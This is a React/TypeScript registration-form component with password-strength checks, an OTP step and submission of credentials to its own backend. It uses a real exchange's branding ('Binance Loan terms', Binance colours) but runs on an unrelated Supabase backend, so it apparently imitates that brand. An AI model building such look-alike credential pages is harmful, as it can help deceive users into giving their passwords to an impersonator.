import React, { useState, useEffect } from 'react';
import {
  Mail,
  Lock,
  Eye,
  EyeOff,
  CheckCircle2,
  XCircle,
  AlertCircle,
  ShieldCheck,
  ArrowRight,
  Info,
} from 'lucide-react';
import { Country, LanguageCode } from '../types';
import { TRANSLATIONS } from '../data/translations';
import { supabase } from '../lib/supabase';

interface RegistrationFormProps {
  selectedCountry: Country | null;
  selectedLanguage: LanguageCode;
  onRegistrationSuccess: (email: string) => void;
  onSwitchToLogin: () => void;
}

export const RegistrationForm: React.FC<RegistrationFormProps> = ({
  selectedCountry,
  selectedLanguage,
  onRegistrationSuccess,
  onSwitchToLogin,
}) => {
  const t = TRANSLATIONS[selectedLanguage] || TRANSLATIONS.en;

  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');

  const [showPassword, setShowPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);

  const [agreeTerms, setAgreeTerms] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);

  // Field touched tracking for live validation feedback
  const [touchedEmail, setTouchedEmail] = useState(false);
  const [touchedPassword, setTouchedPassword] = useState(false);
  const [touchedConfirmPassword, setTouchedConfirmPassword] = useState(false);

  // Security requirements evaluation
  const hasMinLength = password.length >= 8;
  const hasUppercase = /[A-Z]/.test(password);
  const hasLowercase = /[a-z]/.test(password);
  const hasNumber = /[0-9]/.test(password);
  const hasSpecial = /[!@#$%^&*()_+\-=[\]{};':"\\|,.<>/?]/.test(password);

  const isPasswordValid = hasMinLength && hasUppercase && hasLowercase && hasNumber && hasSpecial;
  const isMatchValid = confirmPassword.length > 0 && password === confirmPassword;

  // Email format validation
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const isEmailValid = emailRegex.test(email.trim());

  // Overall form readiness
  const isFormValid = isEmailValid && isPasswordValid && isMatchValid && agreeTerms;

  // Password strength score 0 - 5
  const strengthScore = [hasMinLength, hasUppercase, hasLowercase, hasNumber, hasSpecial].filter(Boolean).length;
  const strengthLevel =
    strengthScore <= 2 ? 'Weak' : strengthScore <= 4 ? 'Moderate' : 'Strong & Secure';
  const strengthColor =
    strengthScore <= 2 ? 'bg-[#F6465D]' : strengthScore <= 4 ? 'bg-[#F0B90B]' : 'bg-[#0ECB81]';

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage(null);
    setTouchedEmail(true);
    setTouchedPassword(true);
    setTouchedConfirmPassword(true);

    if (!isEmailValid) {
      setErrorMessage('Please provide a valid email address (e.g. name@example.com).');
      return;
    }

    if (!isPasswordValid) {
      setErrorMessage('Password does not meet all required security criteria.');
      return;
    }

    if (password !== confirmPassword) {
      setErrorMessage(t.pwdMatchInvalid);
      return;
    }

    if (!agreeTerms) {
      setErrorMessage('Please accept the Binance Loan terms and risk disclosure.');
      return;
    }

    setIsLoading(true);

    try {
      // 1. Call real Supabase Auth to dispatch official OTP code to real email inbox
      const { error: otpError } = await supabase.auth.signInWithOtp({
        email: email.trim().toLowerCase(),
        options: {
          shouldCreateUser: true,
        },
      });

      if (otpError) {
        throw otpError;
      }

      // 2. Register pending account credentials with backend
      const response = await fetch('/api/auth/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: email.trim().toLowerCase(),
          password,
          confirmPassword,
          countryId: selectedCountry?.id,
          languageCode: selectedLanguage,
        }),
      });

      if (!response.ok) {
        const data = await response.json();
        throw new Error(data.error || 'Failed to submit registration.');
      }

      // Transition to Email Verification screen
      onRegistrationSuccess(email.trim().toLowerCase());
    } catch (err: any) {
      setErrorMessage(err.message || 'An unexpected error occurred during registration.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div id="registration-form-container" className="w-full">
      {/* Title & Subtitle */}
      <div className="mb-6">
        <h2 className="text-2xl font-extrabold text-[#EAECEF] tracking-tight">
          {t.registerTitle}
        </h2>
        <p className="mt-1 text-sm text-[#848E9C]">
          {t.registerSubtitle}
        </p>
      </div>

      {/* Selected Country Badge notice */}
      {selectedCountry && (
        <div className="mb-5 flex items-center justify-between rounded-lg border border-[#2B313A] bg-[#181A20] px-3.5 py-2 text-xs">
          <div className="flex items-center space-x-2">
            <span className="text-lg">{selectedCountry.flag}</span>
            <span className="font-semibold text-[#EAECEF]">{selectedCountry.name}</span>
            <span className="text-[#848E9C]">({selectedCountry.currency})</span>
          </div>
          <span className="rounded bg-[#F0B90B]/10 px-2 py-0.5 text-[11px] font-bold text-[#F0B90B]">
            APR {selectedCountry.loanInterestRate}
          </span>
        </div>
      )}

      {/* Error alert banner */}
      {errorMessage && (
        <div
          id="registration-error-alert"
          className="mb-5 flex items-start space-x-2.5 rounded-lg border border-[#F6465D]/30 bg-[#F6465D]/10 p-3 text-xs text-[#F6465D]"
        >
          <AlertCircle className="h-4 w-4 shrink-0 mt-0.5" />
          <span className="font-medium leading-relaxed">{errorMessage}</span>
        </div>
      )}

      <form onSubmit={handleSubmit} noValidate className="space-y-4">
        {/* 1. Email Field */}
        <div>
          <label htmlFor="reg-email" className="mb-1.5 block text-xs font-semibold text-[#EAECEF]">
            {t.emailLabel} <span className="text-[#F0B90B]">*</span>
          </label>
          <div className="relative">
            <div className="pointer-events-none absolute inset-y-0 left-0 flex items-center pl-3">
              <Mail className="h-4 w-4 text-[#848E9C]" />
            </div>
            <input
              id="reg-email"
              type="email"
              autoComplete="email"
              value={email}
              onChange={(e) => {
                setEmail(e.target.value);
                if (errorMessage) setErrorMessage(null);
              }}
              onBlur={() => setTouchedEmail(true)}
              placeholder={t.emailPlaceholder}
              className={`w-full rounded-lg border bg-[#181A20] py-2.5 pl-10 pr-10 text-sm text-[#EAECEF] placeholder-[#5E6673] outline-none transition-all ${
                touchedEmail && !isEmailValid && email.length > 0
                  ? 'border-[#F6465D] focus:border-[#F6465D] focus:ring-1 focus:ring-[#F6465D]'
                  : touchedEmail && isEmailValid
                  ? 'border-[#0ECB81] focus:border-[#0ECB81]'
                  : 'border-[#2B313A] focus:border-[#F0B90B] focus:ring-1 focus:ring-[#F0B90B]'
              }`}
            />
            {touchedEmail && email.length > 0 && (
              <div className="pointer-events-none absolute inset-y-0 right-0 flex items-center pr-3">
                {isEmailValid ? (
                  <CheckCircle2 className="h-4 w-4 text-[#0ECB81]" />
                ) : (
                  <XCircle className="h-4 w-4 text-[#F6465D]" />
                )}
              </div>
            )}
          </div>
          {touchedEmail && !isEmailValid && email.length > 0 && (
            <p id="reg-email-error" className="mt-1 text-xs text-[#F6465D]">
              Please enter a valid email format (e.g. user@domain.com).
            </p>
          )}
        </div>

        {/* 2. Password Field */}
        <div>
          <div className="flex items-center justify-between mb-1.5">
            <label htmlFor="reg-password" className="block text-xs font-semibold text-[#EAECEF]">
              {t.passwordLabel} <span className="text-[#F0B90B]">*</span>
            </label>
            {password.length > 0 && (
              <span className="text-[11px] text-[#848E9C]">
                Strength:{' '}
                <strong
                  className={
                    strengthScore <= 2
                      ? 'text-[#F6465D]'
                      : strengthScore <= 4
                      ? 'text-[#F0B90B]'
                      : 'text-[#0ECB81]'
                  }
                >
                  {strengthLevel}
                </strong>
              </span>
            )}
          </div>
          <div className="relative">
            <div className="pointer-events-none absolute inset-y-0 left-0 flex items-center pl-3">
              <Lock className="h-4 w-4 text-[#848E9C]" />
            </div>
            <input
              id="reg-password"
              type={showPassword ? 'text' : 'password'}
              autoComplete="new-password"
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
                if (errorMessage) setErrorMessage(null);
              }}
              onBlur={() => setTouchedPassword(true)}
              placeholder={t.passwordPlaceholder}
              className={`w-full rounded-lg border bg-[#181A20] py-2.5 pl-10 pr-11 text-sm text-[#EAECEF] placeholder-[#5E6673] outline-none transition-all ${
                touchedPassword && !isPasswordValid && password.length > 0
                  ? 'border-[#F6465D] focus:border-[#F6465D]'
                  : touchedPassword && isPasswordValid
                  ? 'border-[#0ECB81] focus:border-[#0ECB81]'
                  : 'border-[#2B313A] focus:border-[#F0B90B] focus:ring-1 focus:ring-[#F0B90B]'
              }`}
            />
            <button
              type="button"
              id="toggle-reg-password-btn"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute inset-y-0 right-0 flex items-center pr-3 text-[#848E9C] hover:text-[#EAECEF] transition-colors"
              aria-label={showPassword ? 'Hide password' : 'Show password'}
            >
              {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
            </button>
          </div>

          {/* Strength progress bar */}
          {password.length > 0 && (
            <div className="mt-2 grid grid-cols-5 gap-1">
              {[1, 2, 3, 4, 5].map((step) => (
                <div
                  key={step}
                  className={`h-1 rounded-full transition-colors ${
                    step <= strengthScore ? strengthColor : 'bg-[#2B313A]'
                  }`}
                />
              ))}
            </div>
          )}

          {/* Detailed Security Checklist */}
          <div className="mt-3 rounded-lg border border-[#2B313A] bg-[#181A20]/70 p-3 text-xs">
            <div className="flex items-center space-x-1.5 text-[11px] font-bold text-[#848E9C] uppercase tracking-wider mb-2">
              <ShieldCheck className="h-3.5 w-3.5 text-[#F0B90B]" />
              <span>{t.passwordStrengthLabel}</span>
            </div>
            <ul className="space-y-1.5 text-[11px]">
              <li
                id="pwd-req-length"
                className={`flex items-center space-x-2 transition-colors ${
                  hasMinLength ? 'text-[#0ECB81]' : 'text-[#848E9C]'
                }`}
              >
                {hasMinLength ? (
                  <CheckCircle2 className="h-3.5 w-3.5 text-[#0ECB81] shrink-0" />
                ) : (
                  <div className="h-3.5 w-3.5 rounded-full border border-[#5E6673] shrink-0" />
                )}
                <span>{t.pwdReqMinLength}</span>
              </li>
              <li
                id="pwd-req-upper"
                className={`flex items-center space-x-2 transition-colors ${
                  hasUppercase ? 'text-[#0ECB81]' : 'text-[#848E9C]'
                }`}
              >
                {hasUppercase ? (
                  <CheckCircle2 className="h-3.5 w-3.5 text-[#0ECB81] shrink-0" />
                ) : (
                  <div className="h-3.5 w-3.5 rounded-full border border-[#5E6673] shrink-0" />
                )}
                <span>{t.pwdReqUppercase}</span>
              </li>
              <li
                id="pwd-req-lower"
                className={`flex items-center space-x-2 transition-colors ${
                  hasLowercase ? 'text-[#0ECB81]' : 'text-[#848E9C]'
                }`}
              >
                {hasLowercase ? (
                  <CheckCircle2 className="h-3.5 w-3.5 text-[#0ECB81] shrink-0" />
                ) : (
                  <div className="h-3.5 w-3.5 rounded-full border border-[#5E6673] shrink-0" />
                )}
                <span>{t.pwdReqLowercase}</span>
              </li>
              <li
                id="pwd-req-number"
                className={`flex items-center space-x-2 transition-colors ${
                  hasNumber ? 'text-[#0ECB81]' : 'text-[#848E9C]'
                }`}
              >
                {hasNumber ? (
                  <CheckCircle2 className="h-3.5 w-3.5 text-[#0ECB81] shrink-0" />
                ) : (
                  <div className="h-3.5 w-3.5 rounded-full border border-[#5E6673] shrink-0" />
                )}
                <span>{t.pwdReqNumber}</span>
              </li>
              <li
                id="pwd-req-special"
                className={`flex items-center space-x-2 transition-colors ${
                  hasSpecial ? 'text-[#0ECB81]' : 'text-[#848E9C]'
                }`}
              >
                {hasSpecial ? (
                  <CheckCircle2 className="h-3.5 w-3.5 text-[#0ECB81] shrink-0" />
                ) : (
                  <div className="h-3.5 w-3.5 rounded-full border border-[#5E6673] shrink-0" />
                )}
                <span>{t.pwdReqSpecial}</span>
              </li>
            </ul>
          </div>
        </div>

        {/* 3. Confirm Password Field */}
        <div>
          <label htmlFor="reg-confirm-password" className="mb-1.5 block text-xs font-semibold text-[#EAECEF]">
            {t.confirmPasswordLabel} <span className="text-[#F0B90B]">*</span>
          </label>
          <div className="relative">
            <div className="pointer-events-none absolute inset-y-0 left-0 flex items-center pl-3">
              <Lock className="h-4 w-4 text-[#848E9C]" />
            </div>
            <input
              id="reg-confirm-password"
              type={showConfirmPassword ? 'text' : 'password'}
              autoComplete="new-password"
              value={confirmPassword}
              onChange={(e) => {
                setConfirmPassword(e.target.value);
                if (errorMessage) setErrorMessage(null);
              }}
              onBlur={() => setTouchedConfirmPassword(true)}
              placeholder={t.confirmPasswordPlaceholder}
              className={`w-full rounded-lg border bg-[#181A20] py-2.5 pl-10 pr-11 text-sm text-[#EAECEF] placeholder-[#5E6673] outline-none transition-all ${
                touchedConfirmPassword && !isMatchValid && confirmPassword.length > 0
                  ? 'border-[#F6465D] focus:border-[#F6465D]'
                  : touchedConfirmPassword && isMatchValid
                  ? 'border-[#0ECB81] focus:border-[#0ECB81]'
                  : 'border-[#2B313A] focus:border-[#F0B90B] focus:ring-1 focus:ring-[#F0B90B]'
              }`}
            />
            <button
              type="button"
              id="toggle-reg-confirm-password-btn"
              onClick={() => setShowConfirmPassword(!showConfirmPassword)}
              className="absolute inset-y-0 right-0 flex items-center pr-3 text-[#848E9C] hover:text-[#EAECEF] transition-colors"
              aria-label={showConfirmPassword ? 'Hide confirm password' : 'Show confirm password'}
            >
              {showConfirmPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
            </button>
          </div>

          {/* Match confirmation feedback */}
          {confirmPassword.length > 0 && (
            <div className="mt-1.5 flex items-center space-x-1.5 text-xs">
              {isMatchValid ? (
                <>
                  <CheckCircle2 className="h-3.5 w-3.5 text-[#0ECB81]" />
                  <span className="text-[#0ECB81] font-medium">{t.pwdMatchValid}</span>
                </>
              ) : (
                <>
                  <XCircle className="h-3.5 w-3.5 text-[#F6465D]" />
                  <span className="text-[#F6465D] font-medium">{t.pwdMatchInvalid}</span>
                </>
              )}
            </div>
          )}
        </div>

        {/* 4. Terms & 18+ Certification */}
        <div className="pt-2">
          <label className="flex items-start space-x-2.5 cursor-pointer">
            <input
              type="checkbox"
              id="reg-terms-checkbox"
              checked={agreeTerms}
              onChange={(e) => setAgreeTerms(e.target.checked)}
              className="mt-0.5 h-4 w-4 rounded border-[#2B313A] bg-[#181A20] text-[#F0B90B] focus:ring-[#F0B90B] accent-[#F0B90B]"
            />
            <span className="text-xs text-[#848E9C] leading-relaxed">
              {t.termsAgreement}
            </span>
          </label>
        </div>

        {/* Security / Verification guarantee note */}
        <div className="flex items-center space-x-2 rounded-lg bg-[#F0B90B]/5 border border-[#F0B90B]/20 p-2.5 text-xs text-[#EAECEF]">
          <Info className="h-4 w-4 text-[#F0B90B] shrink-0" />
          <span className="text-[11px] text-[#848E9C]">
            <strong className="text-[#EAECEF]">Email Verification Required:</strong> For your security, your account will not be created until your 6-digit email code is confirmed.
          </span>
        </div>

        {/* Submit button */}
        <button
          type="submit"
          id="submit-registration-btn"
          disabled={isLoading || !isFormValid}
          className={`w-full flex items-center justify-center space-x-2 rounded-lg py-3 text-sm font-bold text-black transition-all ${
            isFormValid && !isLoading
              ? 'bg-[#F0B90B] hover:bg-[#FCD535] active:scale-[0.99] shadow-lg shadow-[#F0B90B]/10 cursor-pointer'
              : 'bg-[#F0B90B]/40 cursor-not-allowed text-black/50'
          }`}
        >
          {isLoading ? (
            <>
              <div className="h-4 w-4 animate-spin rounded-full border-2 border-black border-t-transparent" />
              <span>{t.creatingAccount}</span>
            </>
          ) : (
            <>
              <span>{t.createAccountBtn}</span>
              <ArrowRight className="h-4 w-4" />
            </>
          )}
        </button>

        {/* Switch to login */}
        <div className="text-center pt-2">
          <span className="text-xs text-[#848E9C]">{t.haveAccountPrompt} </span>
          <button
            type="button"
            id="switch-to-login-link-btn"
            onClick={onSwitchToLogin}
            className="text-xs font-bold text-[#F0B90B] hover:underline"
          >
            {t.loginTab}
          </button>
        </div>
      </form>
    </div>
  );
};
